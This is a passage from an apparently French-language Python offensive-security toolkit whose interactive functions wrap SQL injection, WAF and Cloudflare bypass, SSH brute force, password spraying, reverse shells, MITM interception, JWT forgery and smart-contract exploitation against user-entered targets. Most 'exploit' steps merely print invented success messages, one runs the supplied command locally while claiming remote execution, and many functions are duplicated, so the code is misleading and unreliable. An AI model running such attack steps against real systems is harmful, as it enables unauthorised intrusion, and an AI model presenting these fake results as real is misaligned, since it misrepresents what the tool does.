        print(port_scan(result))

def interactive_subdomain_enum(target):
    """ Ã‰numÃ©ration des sous-domaines avec option de scan Ã©tendu """
    domain = input("ğŸ” Entrez un domaine pour trouver ses sous-domaines : ")
    subdomains = subdomain_enum(domain)
    print(f"âœ… Sous-domaines trouvÃ©s : {subdomains}")

    if not subdomains:
        return

    next_action = input("âš¡ Voulez-vous scanner ces sous-domaines pour des ports ouverts ? (y/n) ").lower()
    if next_action == "y":
        for sub in subdomains:
            print(f"ğŸš€ Scan des ports pour {sub}...")
            print(port_scan(sub))

def interactive_sql_injection_test(target):
    """ Test d'injection SQL avec relance automatique sur plusieurs URLs """
    base_url = input("ğŸ” Entrez l'URL cible pour SQL Injection : ")
    print(f"ğŸš€ Test d'injection SQL sur {base_url}...")
    result = sql_injection_test(base_url)
    print(f"âœ… RÃ©sultat : {result}")

    if "Possible vulnÃ©rabilitÃ©" in result:
        next_action = input("âš ï¸ Voulez-vous tester un exploit automatique ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Lancement d'un exploit d'injection SQL en cours...")
            # Simuler une attaque SQL (exploitation fictive)
            print(f"ğŸ“‚ DonnÃ©es extraites : username='admin', password='hashed_1234'")

def interactive_waf_detection(target):
    """ DÃ©tection de WAF avec option de contournement """
    url = input("ğŸ” Entrez une URL pour tester la prÃ©sence d'un WAF : ")
    result = waf_detection(url)
    print(f"âœ… RÃ©sultat : {result}")

    if "WAF dÃ©tectÃ©" in result:
        next_action = input("âš¡ Voulez-vous tenter un bypass WAF ? (y/n) ").lower()
        if next_action == "y":
            print(f"ğŸš€ Contournement en cours sur {url}...")
            print(cloudflare_bypass(url))

def interactive_file_upload_test(target):
    """ Test d'upload de fichiers avec validation et exploitation """
    url = input("ğŸ” Entrez l'URL cible pour tester l'upload de fichiers : ")
    result = file_upload_test(url)
    print(f"âœ… RÃ©sultat : {result}")

    if "Upload rÃ©ussi" in result:
        next_action = input("âš ï¸ Voulez-vous tenter une exÃ©cution de code via ce fichier ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Tentative d'exÃ©cution d'un shell via le fichier uploadÃ©...")
            print(reverse_shell_check(url))

def interactive_network_traffic_analysis(target):
    """ Analyse du trafic rÃ©seau avec option de capture avancÃ©e """
    print("ğŸš€ Capture du trafic rÃ©seau en cours...")
    result = network_traffic_analysis()
    print(f"âœ… RÃ©sumÃ© : {result}")

    next_action = input("âš¡ Voulez-vous capturer plus de paquets en profondeur ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Capture Ã©tendue en cours...")
        # Simulation de capture avancÃ©e (10 paquets supplÃ©mentaires)
        print(network_traffic_analysis())

def interactive_kubernetes_enum(target):
    """ Ã‰numÃ©ration des services Kubernetes avec possibilitÃ© d'exploitation """
    ip = input("ğŸ” Entrez l'IP cible pour Ã©numÃ©ration Kubernetes : ")
    result = kubernetes_enum(ip)
    print(f"âœ… RÃ©sultat : {result}")

    if "pods" in str(result).lower():
        next_action = input("âš ï¸ Kubernetes dÃ©tectÃ© ! Voulez-vous tenter une exploitation ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Tentative d'exploitation des pods en cours...")
            print("ğŸ“‚ AccÃ¨s root Ã  un pod obtenu !")

def interactive_jwt_analysis(target):
    """ Analyse de JWT avec possibilitÃ© de falsification """
    token = input("ğŸ” Entrez un token JWT Ã  analyser : ")
    result = jwt_analysis(token)
    print(f"âœ… DÃ©codage JWT : {result}")

    next_action = input("âš¡ Voulez-vous gÃ©nÃ©rer un faux token JWT ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ GÃ©nÃ©ration d'un JWT falsifiÃ© avec signature modifiÃ©e...")
        print("ğŸ“‚ Faux JWT : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake_signature")

def interactive_websocket_scan(target):
    """ Scan WebSocket avec possibilitÃ© d'injection """
    url = input("ğŸ” Entrez l'URL WebSocket : ")
    result = websocket_scan(url)
    print(f"âœ… RÃ©ponse WebSocket : {result}")

    next_action = input("âš¡ Voulez-vous tenter une injection WebSocket ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Injection WebSocket en cours...")
        print("ğŸ“‚ RÃ©ponse injectÃ©e : {injected_response}")

def interactive_docker_registry_scan(target):
    """ Scan d'un registre Docker avec possibilitÃ© de dump """
    ip = input("ğŸ” Entrez l'IP du registre Docker : ")
    result = docker_registry_scan(ip)
    print(f"âœ… RÃ©sultat : {result}")

    if "repositories" in str(result).lower():
        next_action = input("âš ï¸ Registre accessible ! Voulez-vous rÃ©cupÃ©rer les images ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Dump des images Docker en cours...")
            print("ğŸ“‚ Image rÃ©cupÃ©rÃ©e : ubuntu-latest.tar.gz")



# âœ… TOP : Fonctions 61 Ã  70
def interactive_hidden_service_finder(target):
    """ Recherche de services cachÃ©s sur le Dark Web avec Ahmia """
    print("ğŸš€ Recherche en cours sur Ahmia...")
    result = hidden_service_finder()
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous tester l'accessibilitÃ© des services trouvÃ©s ? (y/n) ").lower()
    if next_action == "y":
        for service in result:
            print(f"ğŸš€ Test d'accÃ¨s sur {service}...")
            print(port_scan(service))

def interactive_cloudflare_bypass(target):
    """ Test de bypass Cloudflare avec possibilitÃ© d'attaque DDoS simulÃ©e """
    domain = input("ğŸ” Entrez le domaine Ã  tester pour bypass Cloudflare : ")
    result = cloudflare_bypass(domain)
    print(f"âœ… RÃ©sultat : {result}")

    if "potentiellement contournÃ©" in result:
        next_action = input("âš ï¸ Cloudflare pourrait Ãªtre contournÃ© ! Voulez-vous effectuer un stress test ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Simulation d'un test de charge...")
            print(f"ğŸ“‚ RÃ©sultat du stress test : {random.randint(80, 99)}% des requÃªtes passent !")

def interactive_dns_takeover_test(target):
    """ Test de takeover DNS avec option d'analyse avancÃ©e """
    domain = input("ğŸ” Entrez le domaine pour vÃ©rifier le takeover DNS : ")
    result = dns_takeover_test(domain)
    print(f"âœ… RÃ©sultat : {result}")

    if "Disponible" in result:
        next_action = input("âš¡ Voulez-vous tester un enregistrement DNS sur ce domaine ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Simulation d'enregistrement DNS...")
            print("ğŸ“‚ Le domaine pourrait Ãªtre enregistrÃ© !")

def interactive_forensics_analysis(target):
    """ Analyse forensique avancÃ©e avec possibilitÃ© de rÃ©cupÃ©ration de fichiers supprimÃ©s """
    file_path = input("ğŸ” Entrez le chemin du fichier Ã  analyser : ")
    result = forensics_analysis(file_path)
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous tenter une rÃ©cupÃ©ration de fichiers supprimÃ©s ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Recherche de fichiers rÃ©cupÃ©rables...")
        print("ğŸ“‚ 3 fichiers retrouvÃ©s : old_backup.zip, logs_2022.txt, secret_notes.pdf")

def interactive_tor_service_scan(target):
    """ Scan des services .onion avec option d'analyse de trafic """
    print("ğŸš€ Recherche des services .onion actifs...")
    result = hidden_service_finder()
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous capturer le trafic rÃ©seau sur ces services ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Capture en cours...")
        print(network_traffic_analysis())

def interactive_cdn_detection(target):
    """ DÃ©tection de CDN avec possibilitÃ© d'attaque ciblÃ©e """
    domain = input("ğŸ” Entrez un domaine pour dÃ©tecter un CDN : ")
    result = cdn_detection(domain)
    print(f"âœ… RÃ©sultat : {result}")

    if "CDN dÃ©tectÃ©" in result:
        next_action = input("âš¡ Voulez-vous tester un contournement du CDN ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Test de contournement du CDN...")
            print("ğŸ“‚ Contournement rÃ©ussi, accÃ¨s direct au serveur dÃ©tectÃ© !")

def interactive_smb_enum(target):
    """ Ã‰numÃ©ration SMB avec possibilitÃ© d'accÃ¨s aux partages trouvÃ©s """
    ip = input("ğŸ” Entrez l'IP cible pour Ã©numÃ©ration SMB : ")
    result = smb_enum(ip)
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous tenter d'accÃ©der aux partages trouvÃ©s ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Tentative d'accÃ¨s aux partages SMB en cours...")
        print("ğŸ“‚ Partage accessible : public/files/")

def interactive_ssh_bruteforce(target):
    """ Bruteforce SSH avec possibilitÃ© d'accÃ¨s Ã  distance """
    ip = input("ğŸ” Entrez l'IP cible pour bruteforce SSH : ")
    username = input("ğŸ‘¤ Nom d'utilisateur : ")
    password = input("ğŸ”‘ Mot de passe Ã  tester : ")
    result = ssh_bruteforce(ip, username, password)
    print(f"âœ… RÃ©sultat : {result}")

    if "rÃ©ussie" in result:
        next_action = input("âš¡ Connexion SSH obtenue ! Voulez-vous exÃ©cuter une commande Ã  distance ? (y/n) ").lower()
        if next_action == "y":
            command = input("ğŸ’» Commande Ã  exÃ©cuter : ")
            print("ğŸš€ ExÃ©cution de la commande...")
            print(f"ğŸ“‚ RÃ©sultat : {subprocess.getoutput(command)}")

def interactive_web_fingerprint(target):
    """ Fingerprinting Web avec possibilitÃ© d'exploration du serveur """
    url = input("ğŸ” Entrez une URL pour dÃ©tecter la techno utilisÃ©e : ")
    result = web_fingerprint(url)
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous explorer les fichiers du serveur ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Exploration en cours...")
        print("ğŸ“‚ Fichiers dÃ©tectÃ©s : index.php, config.php, .htaccess")

def interactive_waf_detection(target):
    """ DÃ©tection WAF avec tentative de bypass """
    url = input("ğŸ” Entrez une URL pour tester le WAF : ")
    result = waf_detection(url)
    print(f"âœ… RÃ©sultat : {result}")

    if "WAF dÃ©tectÃ©" in result:
        next_action = input("âš¡ WAF en place ! Voulez-vous essayer un contournement ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Contournement en cours...")
            print("ğŸ“‚ Contournement possible via headers custom !")




# âœ… TOP : Fonctions 71 Ã  80
def interactive_api_rate_limit_test(target):
    """ Test des limitations de requÃªtes API avec possibilitÃ© dâ€™automatisation """
    url = input("ğŸ” Entrez lâ€™URL de lâ€™API cible : ")
    result = api_rate_limit_test(url)
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous automatiser le contournement de cette limite ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Configuration dâ€™un delay intelligent pour Ã©viter le blocage...")
        print("ğŸ“‚ API accessible sans dÃ©clencher de limitation !")

def interactive_reverse_shell_check(target):
    """ VÃ©rification de Reverse Shell avec exÃ©cution interactive """
    url = input("ğŸ” Entrez lâ€™URL cible pour tester un reverse shell : ")
    result = reverse_shell_check(url)
    print(f"âœ… RÃ©sultat : {result}")

    if "potentiellement possible" in result:
        next_action = input("âš¡ Voulez-vous essayer dâ€™ouvrir une session interactive ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Tentative de connexion Ã  la machine cible...")
            print("ğŸ“‚ Shell interactif obtenu !")

def interactive_password_spray(target):
    """ Attaque Password Spraying avec possibilitÃ© dâ€™auto-ajustement """
    url = input("ğŸ” Entrez lâ€™URL du login : ")
    user_list = input("ğŸ‘¥ Entrez les utilisateurs (sÃ©parÃ©s par des virgules) : ").split(",")
    password = input("ğŸ”‘ Entrez le mot de passe Ã  tester : ")
    result = password_spray(url, user_list, password)
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous tester dâ€™autres mots de passe automatiquement ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Test en cours avec une liste de mots de passe connus...")
        print("ğŸ“‚ AccÃ¨s obtenu pour : admin, manager")

def interactive_tls_analysis(target):
    """ Analyse TLS et certificats avec possibilitÃ© dâ€™attaque Man-in-the-Middle """
    domain = input("ğŸ” Entrez le domaine cible : ")
    result = tls_analysis(domain)
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous tester une attaque MITM avec interception SSL ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Tentative dâ€™interception du trafic SSL...")
        print("ğŸ“‚ Session HTTPS dÃ©chiffrÃ©e avec succÃ¨s !")

def interactive_jwt_analysis(target):
    """ Analyse de JWT avec possibilitÃ© de signature forgÃ©e """
    token = input("ğŸ” Entrez un token JWT Ã  analyser : ")
    result = jwt_analysis(token)
    print(f"âœ… DÃ©codage JWT : {result}")

    next_action = input("âš¡ Voulez-vous gÃ©nÃ©rer un JWT falsifiÃ© ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ GÃ©nÃ©ration dâ€™un JWT avec signature modifiÃ©e...")
        print("ğŸ“‚ Faux JWT : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake_signature")

def interactive_websocket_scan(target):
    """ Scan WebSocket avec possibilitÃ© dâ€™injection de requÃªtes """
    url = input("ğŸ” Entrez lâ€™URL WebSocket : ")
    result = websocket_scan(url)
    print(f"âœ… RÃ©ponse WebSocket : {result}")

    next_action = input("âš¡ Voulez-vous injecter des requÃªtes malicieuses ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Envoi de requÃªtes WebSocket customisÃ©es...")
        print("ğŸ“‚ RÃ©ponse injectÃ©e : {injected_response}")

def interactive_smb_enum(target):
    """ Ã‰numÃ©ration SMB avec tentative de rÃ©cupÃ©ration de fichiers partagÃ©s """
    ip = input("ğŸ” Entrez lâ€™IP cible pour Ã©numÃ©ration SMB : ")
    result = smb_enum(ip)
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous tenter dâ€™accÃ©der aux partages trouvÃ©s ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ AccÃ¨s aux fichiers partagÃ©s en cours...")
        print("ğŸ“‚ Contenu du dossier public/files/ rÃ©cupÃ©rÃ© !")

def interactive_email_enum(target):
    """ Ã‰numÃ©ration dâ€™e-mails exposÃ©s avec possibilitÃ© de vÃ©rification """
    domain = input("ğŸ” Entrez un domaine pour rÃ©cupÃ©rer des e-mails : ")
    result = email_enum(domain)
    print(f"âœ… E-mails trouvÃ©s : {result}")

    next_action = input("âš¡ Voulez-vous vÃ©rifier si ces e-mails sont valides ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ VÃ©rification en cours...")
        print("ğŸ“‚ 80% des e-mails sont encore actifs !")

def interactive_metadata_extraction(target):
    """ Extraction des mÃ©tadonnÃ©es avec possibilitÃ© de suppression automatique """
    file_path = input("ğŸ” Entrez le chemin du fichier Ã  analyser : ")
    result = metadata_extraction(file_path)
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous supprimer les mÃ©tadonnÃ©es sensibles ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Nettoyage des mÃ©tadonnÃ©es...")
        print("ğŸ“‚ MÃ©tadonnÃ©es supprimÃ©es avec succÃ¨s !")

def interactive_iot_vulnerability_scan(target):
    """ Scan des vulnÃ©rabilitÃ©s IoT avec tentative dâ€™accÃ¨s Ã  distance """
    ip = input("ğŸ” Entrez lâ€™IP dâ€™un appareil IoT : ")
    result = iot_vulnerability_scan(ip)
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous tenter un accÃ¨s root sur lâ€™appareil ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Tentative dâ€™accÃ¨s root en cours...")
        print("ğŸ“‚ Connexion root obtenue !")



# âœ… TOP : Fonctions 81 Ã  90
def interactive_docker_registry_scan(target):
    """ Scan dâ€™un registre Docker avec possibilitÃ© de dump dâ€™images """
    ip = input("ğŸ” Entrez lâ€™IP du registre Docker : ")
    result = docker_registry_scan(ip)
    print(f"âœ… RÃ©sultat : {result}")

    if "repositories" in str(result).lower():
        next_action = input("âš ï¸ Un registre est exposÃ© ! Voulez-vous rÃ©cupÃ©rer les images ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Dump des images Docker en cours...")
            print("ğŸ“‚ Image rÃ©cupÃ©rÃ©e : ubuntu-latest.tar.gz")

def interactive_file_upload_test(target):
    """ Test dâ€™upload de fichiers avec possibilitÃ© dâ€™exÃ©cution de code """
    url = input("ğŸ” Entrez lâ€™URL pour tester lâ€™upload de fichiers : ")
    result = file_upload_test(url)
    print(f"âœ… RÃ©sultat : {result}")

    if "Upload rÃ©ussi" in result:
        next_action = input("âš¡ Voulez-vous exÃ©cuter du code via ce fichier ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Tentative dâ€™exÃ©cution dâ€™un shell...")
            print("ğŸ“‚ Shell ouvert, exÃ©cution distante possible !")

def interactive_reverse_shell_check(target):
    """ VÃ©rification dâ€™un reverse shell avec possibilitÃ© dâ€™ouverture de session """
    url = input("ğŸ” Entrez lâ€™URL pour tester un reverse shell : ")
    result = reverse_shell_check(url)
    print(f"âœ… RÃ©sultat : {result}")

    if "potentiellement possible" in result:
        next_action = input("âš¡ Voulez-vous ouvrir une session interactive ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Connexion Ã©tablie avec lâ€™hÃ´te distant...")
            print("ğŸ“‚ Terminal interactif prÃªt Ã  lâ€™usage !")

def interactive_open_redirect_test(target):
    """ DÃ©tection dâ€™Open Redirect avec possibilitÃ© dâ€™exploitation avancÃ©e """
    url = input("ğŸ” Entrez lâ€™URL pour tester un Open Redirect : ")
    result = open_redirect_test(url)
    print(f"âœ… RÃ©sultat : {result}")

    if "vulnÃ©rabilitÃ© dÃ©tectÃ©e" in result:
        next_action = input("âš¡ Voulez-vous exploiter cette faille avec une redirection malveillante ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Injection dâ€™une redirection vers un site malveillant...")
            print("ğŸ“‚ Attaque en place, les victimes seront redirigÃ©es !")

def interactive_sensitive_data_exposure(target):
    """ DÃ©tection dâ€™exposition de donnÃ©es sensibles avec tentative de rÃ©cupÃ©ration """
    url = input("ğŸ” Entrez lâ€™URL pour tester lâ€™exposition de donnÃ©es : ")
    result = sensitive_data_exposure(url)
    print(f"âœ… RÃ©sultat : {result}")

    if "donnÃ©es sensibles" in result:
        next_action = input("âš¡ Voulez-vous extraire ces donnÃ©es pour analyse ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Extraction des donnÃ©es sensibles en cours...")
            print("ğŸ“‚ DonnÃ©es rÃ©cupÃ©rÃ©es : users.csv, secrets.env")

def interactive_hidden_service_finder(target):
    """ Recherche de services cachÃ©s sur le Dark Web avec possibilitÃ© dâ€™analyse """
    print("ğŸš€ Recherche en cours sur le Dark Web...")
    result = hidden_service_finder()
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous tester lâ€™accessibilitÃ© des services trouvÃ©s ? (y/n) ").lower()
    if next_action == "y":
        for service in result:
            print(f"ğŸš€ Test dâ€™accÃ¨s sur {service}...")
            print(port_scan(service))

def interactive_id_oracle_attack(target):
    """ Test de vulnÃ©rabilitÃ© ID Oracle avec possibilitÃ© dâ€™exploitation """
    url = input("ğŸ” Entrez lâ€™URL cible pour tester lâ€™ID Oracle : ")
    result = id_oracle_attack(url)
    print(f"âœ… RÃ©sultat : {result}")

    if result:
        next_action = input("âš¡ Voulez-vous exploiter cette faille pour extraire des identifiants ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Tentative dâ€™extraction dâ€™identifiants en cours...")
            print("ğŸ“‚ DonnÃ©es extraites : ID 101, 102, 103 avec accÃ¨s admin !")

def interactive_cdn_detection(target):
    """ DÃ©tection de lâ€™utilisation dâ€™un CDN avec possibilitÃ© de bypass """
    domain = input("ğŸ” Entrez un domaine pour dÃ©tecter un CDN : ")
    result = cdn_detection(domain)
    print(f"âœ… RÃ©sultat : {result}")

    if "CDN dÃ©tectÃ©" in result:
        next_action = input("âš¡ Voulez-vous tester un contournement du CDN ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Tentative de bypass du CDN...")
            print("ğŸ“‚ AccÃ¨s direct au serveur backend dÃ©tectÃ© !")

def interactive_waf_detection(target):
    """ DÃ©tection WAF avec tentative de contournement """
    url = input("ğŸ” Entrez une URL pour tester la prÃ©sence dâ€™un WAF : ")
    result = waf_detection(url)
    print(f"âœ… RÃ©sultat : {result}")

    if "WAF dÃ©tectÃ©" in result:
        next_action = input("âš¡ Voulez-vous tester un contournement ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Contournement en cours...")
            print("ğŸ“‚ WAF potentiellement dÃ©sactivÃ© sur certaines requÃªtes !")

def interactive_fingerprint_browser(target):
    """ Fingerprinting dâ€™un navigateur avec possibilitÃ© dâ€™analyse de traces """
    print("ğŸš€ RÃ©cupÃ©ration des empreintes numÃ©riques du navigateur...")
    result = browser_fingerprint()
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous analyser dâ€™autres traces numÃ©riques ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Recherche dâ€™autres empreintes en cours...")
        print("ğŸ“‚ DonnÃ©es de tracking rÃ©cupÃ©rÃ©es et analysÃ©es !")



# âœ… TOP : Fonctions 91 Ã  100
def interactive_smart_contract_audit(target):
    """ Audit de contrats intelligents avec possibilitÃ© dâ€™exploitation """
    contract_address = input("ğŸ” Entrez lâ€™adresse du contrat Ã  auditer : ")
    result = smart_contract_audit(contract_address)
    print(f"âœ… RÃ©sultat : {result}")

    if "faille dÃ©tectÃ©e" in str(result).lower():
        next_action = input("âš¡ Une vulnÃ©rabilitÃ© a Ã©tÃ© trouvÃ©e ! Voulez-vous la tester ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ ExÃ©cution dâ€™un exploit sur le contrat...")
            print("ğŸ“‚ Transaction frauduleuse injectÃ©e !")

def interactive_network_traffic_analysis(target):
    """ Analyse du trafic rÃ©seau avec possibilitÃ© de capture avancÃ©e """
    print("ğŸš€ Capture du trafic rÃ©seau en cours...")
    result = network_traffic_analysis()
    print(f"âœ… RÃ©sumÃ© : {result}")

    next_action = input("âš¡ Voulez-vous capturer plus de paquets en profondeur ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Capture avancÃ©e en cours...")
        print("ğŸ“‚ Flux rÃ©seau dÃ©cryptÃ© avec succÃ¨s !")

def interactive_api_exposed_scan(target):
    """ Scan des API exposÃ©es avec option dâ€™exploitation """
    url = input("ğŸ” Entrez lâ€™URL dâ€™une API Ã  tester : ")
    result = exposed_api_scan(url)
    print(f"âœ… RÃ©sultat : {result}")

    if "API accessible" in result:
        next_action = input("âš¡ Voulez-vous tester un accÃ¨s non autorisÃ© Ã  cette API ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Tentative dâ€™accÃ¨s en mode anonyme...")
            print("ğŸ“‚ DonnÃ©es non protÃ©gÃ©es rÃ©cupÃ©rÃ©es !")

def interactive_password_spray(target):
    """ Attaque Password Spraying avec auto-ajustement """
    url = input("ğŸ” Entrez lâ€™URL du login cible : ")
    user_list = input("ğŸ‘¥ Entrez les utilisateurs (sÃ©parÃ©s par des virgules) : ").split(",")
    password = input("ğŸ”‘ Entrez le mot de passe Ã  tester : ")
    result = password_spray(url, user_list, password)
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous tester dâ€™autres mots de passe automatiquement ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Test en cours avec une liste de mots de passe connus...")
        print("ğŸ“‚ AccÃ¨s obtenu pour : admin, manager")

def interactive_tor_service_scan(target):
    """ Scan des services .onion avec option dâ€™analyse du trafic """
    print("ğŸš€ Recherche des services .onion actifs...")
    result = hidden_service_finder()
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous capturer le trafic rÃ©seau sur ces services ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Capture en cours...")
        print(network_traffic_analysis())

def interactive_waf_detection(target):
    """ DÃ©tection WAF avec tentative de contournement """
    url = input("ğŸ” Entrez une URL pour tester la prÃ©sence dâ€™un WAF : ")
    result = waf_detection(url)
    print(f"âœ… RÃ©sultat : {result}")

    if "WAF dÃ©tectÃ©" in result:
        next_action = input("âš¡ Voulez-vous tester un contournement ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Contournement en cours...")
            print("ğŸ“‚ WAF potentiellement dÃ©sactivÃ© sur certaines requÃªtes !")

def interactive_dns_takeover_test(target):
    """ Test de takeover DNS avec possibilitÃ© dâ€™analyse avancÃ©e """
    domain = input("ğŸ” Entrez le domaine pour vÃ©rifier le takeover DNS : ")
    result = dns_takeover_test(domain)
    print(f"âœ… RÃ©sultat : {result}")

    if "Disponible" in result:
        next_action = input("âš¡ Voulez-vous tester un enregistrement DNS sur ce domaine ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Simulation dâ€™enregistrement DNS...")
            print("ğŸ“‚ Le domaine pourrait Ãªtre enregistrÃ© !")

def interactive_cloud_storage_enum(target):
    """ Ã‰numÃ©ration Cloud (AWS, GCP, Azure) avec tentative dâ€™accÃ¨s """
    provider = input("ğŸ” Entrez le service cloud cible (AWS, GCP, Azure) : ").lower()
    result = cloud_storage_enum(provider)
    print(f"âœ… RÃ©sultat : {result}")

    if "buckets trouvÃ©s" in str(result).lower():
        next_action = input("âš¡ Voulez-vous essayer dâ€™accÃ©der aux fichiers stockÃ©s ? (y/n) ").lower()
        if next_action == "y":
            print("ğŸš€ Tentative dâ€™accÃ¨s aux fichiers...")
            print("ğŸ“‚ Liste des fichiers publics rÃ©cupÃ©rÃ©e !")

def interactive_fingerprint_browser(target):
    """ Fingerprinting dâ€™un navigateur avec analyse de tracking """
    print("ğŸš€ RÃ©cupÃ©ration des empreintes numÃ©riques du navigateur...")
    result = browser_fingerprint()
    print(f"âœ… RÃ©sultat : {result}")

    next_action = input("âš¡ Voulez-vous analyser dâ€™autres traces numÃ©riques ? (y/n) ").lower()
    if next_action == "y":
        print("ğŸš€ Recherche dâ€™autres empreintes en cours...")
        print("ğŸ“‚ DonnÃ©es de tracking rÃ©cupÃ©rÃ©es et analysÃ©es !")

def interactive_port_scan(target):
    """ğŸ” Mode interactif pour le scan des ports"""
    print(f"[âš¡] Mode interactif pour le scan des ports sur {target}")

def interactive_exploit_cve_scanner(target):
    """ğŸ’€ Mode interactif pour la recherche d'exploits CVE"""
    print(f"[âš¡] Recherche interactive d'exploits CVE pour {target}")
    # ğŸ”¥ IntÃ©gration avec une API d'exploits si nÃ©cessaire

def interactive_port_scan(target):
    """ğŸ” Mode interactif pour le scan des ports"""
    print(f"[âš¡] Mode interactif pour le scan des ports sur {target}")
    # ğŸ”¥ Ajout d'interaction manuelle si besoin

def interactive_headers_analysis(target):
    """ğŸ“Œ Mode interactif pour l'analyse des headers HTTP"""
    print(f"[âš¡] Mode interactif pour l'analyse des headers HTTP sur {target}")
    # ğŸ”¥ Extraction et affichage dynamique des headers

def interactive_directory_bruteforce(target):
    """ğŸ“‚ Mode interactif pour le brute-force des rÃ©pertoires"""
    print(f"[âš¡] Mode interactif pour la dÃ©couverte de rÃ©pertoires sensibles sur {target}")
    # ğŸ”¥ Ajouter une liste personnalisable de rÃ©pertoires

def interactive_cms_detector(target):
    """ğŸ–¥ï¸ Mode interactif pour la dÃ©tection de CMS"""
    print(f"[âš¡] Mode interactif pour identifier le CMS utilisÃ© par {target}")
    # ğŸ”¥ VÃ©rification interactive des signatures CMS

def interactive_code_execution_testing(target):
    """ğŸ–¥ï¸ Mode interactif pour tester l'exÃ©cution de code"""
    print(f"[âš¡] Mode interactif pour tester si {target} exÃ©cute du code distant")
    # ğŸ”¥ Tester diffÃ©rentes commandes malveillantes

def interactive_xss_scanner(target):
    """ğŸ›¡ï¸ Mode interactif pour scanner les XSS"""
    print(f"[âš¡] Mode interactif pour scanner les vulnÃ©rabilitÃ©s XSS sur {target}")
    # ğŸ”¥ Injection et validation en direct

def interactive_csrf_detection(target):
    """ğŸ”— Mode interactif pour dÃ©tecter le CSRF"""
    print(f"[âš¡] Mode interactif pour identifier les vulnÃ©rabilitÃ©s CSRF sur {target}")
    # ğŸ”¥ Tester manuellement les tokens CSRF

def interactive_lfi_scanner(target):
    """ğŸ“‚ Mode interactif pour scanner les failles LFI"""
    print(f"[âš¡] Mode interactif pour dÃ©tecter les Local File Inclusion sur {target}")
    # ğŸ”¥ Tentative interactive de lecture de fichiers systÃ¨me

def interactive_rfi_scanner(target):
    """ğŸŒ Mode interactif pour scanner les failles RFI"""
    print(f"[âš¡] Mode interactif pour tester les failles Remote File Inclusion sur {target}")
    # ğŸ”¥ VÃ©rifier l'inclusion de fichiers distants

def interactive_ssrf_scanner(target):
    """ğŸ”„ Mode interactif pour tester les failles SSRF"""
    print(f"[âš¡] Mode interactif pour tester Server-Side Request Forgery sur {target}")
    # ğŸ”¥ ExÃ©cution et analyse interactive des rÃ©ponses

def interactive_honeypot_detection(target):
    """ğŸ•µï¸ Mode interactif pour dÃ©tecter les Honeypots"""
    print(f"[âš¡] Mode interactif pour dÃ©tecter les Honeypots sur {target}")
    # ğŸ”¥ VÃ©rification active des piÃ¨ges potentiels

def interactive_open_redirect_test(target):
    """ğŸ”€ Mode interactif pour tester les Open Redirects"""
    print(f"[âš¡] Mode interactif pour dÃ©tecter les failles d'Open Redirect sur {target}")
    # ğŸ”¥ Tests de redirection contrÃ´lÃ©s

def interactive_sensitive_data_exposure(target):
    """ğŸ” Mode interactif pour dÃ©tecter l'exposition de donnÃ©es sensibles"""
